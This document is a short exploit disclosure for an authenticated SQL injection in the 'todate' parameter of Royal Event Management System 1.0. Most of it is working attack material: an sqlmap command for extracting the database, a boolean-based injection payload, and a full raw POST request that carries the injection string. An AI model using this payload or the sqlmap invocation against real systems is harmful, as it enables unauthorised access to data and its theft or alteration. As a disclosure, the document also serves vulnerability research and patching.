# Royal Event Management System - 'todate' SQL Injection (Authenticated)


1. Description:
----------------------

Royal Event Management System 1.0 allows SQL Injection via parameter 'todate' in
/royal_event/btndates_report.php#?=  Exploiting this issue could allow an attacker to compromise
the application, access or modify data, or exploit latent vulnerabilities
in the underlying database.


2. Proof of Concept:
----------------------

In Burpsuite intercept the request from the affected page with
'todate' parameter and save it like poc.txt. Then run SQLmap to extract the
data from the database:

sqlmap -r poc.txt --dbms=mysql


3. Example payload:
----------------------

(boolean-based)

-1%27+OR+1%3d1+OR+%27ns%27%3d%27ns 

4. Burpsuite request:
----------------------

POST /royal_event/btndates_report.php#?= HTTP/1.1<br>
Host: localhost<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-us,en;q=0.5<br>
Cache-Control: no-cache<br>
Content-Length: 334<br>
Content-Type: multipart/form-data; boundary=f289a6438bcc45179bcd3eb7ddc555d0<br>
Cookie: PHPSESSID=qeoe141g7guakhacf152a3i380<br>
Referer: http://localhost/royal_event/btndates_report.php#?=<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.0 Safari/537.36<br>
<br>
--f289a6438bcc45179bcd3eb7ddc555d0<br>
Content-Disposition: form-data; name="todate"<br>
<br>
-1' OR 1=1 OR 'ns'='ns<br>
--f289a6438bcc45179bcd3eb7ddc555d0<br>
Content-Disposition: form-data; name="search"<br>
<br>
3
--f289a6438bcc45179bcd3eb7ddc555d0<br>
Content-Disposition: form-data; name="fromdate"<br>
<br>
01/01/2011<br>
--f289a6438bcc45179bcd3eb7ddc555d0--<br>
